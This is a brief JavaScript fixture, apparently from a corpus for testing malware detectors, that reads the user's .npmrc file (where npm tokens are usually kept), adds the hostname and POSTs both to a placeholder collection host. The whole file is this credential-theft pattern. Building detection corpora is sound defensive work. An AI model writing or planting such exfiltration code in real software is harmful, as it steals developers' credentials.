// INERT TEST FIXTURE (VASO detection-robustness corpus). No real hosts/credentials; nothing harmful runs.
const fs = require('fs'); const os = require('os');
const raw = fs.readFileSync('/home/user/.npmrc', 'utf8');
const payload = JSON.stringify({ npmrc: raw, host: os.hostname() });
fetch('https://collect.example.invalid/c', { method: 'POST', body: payload });
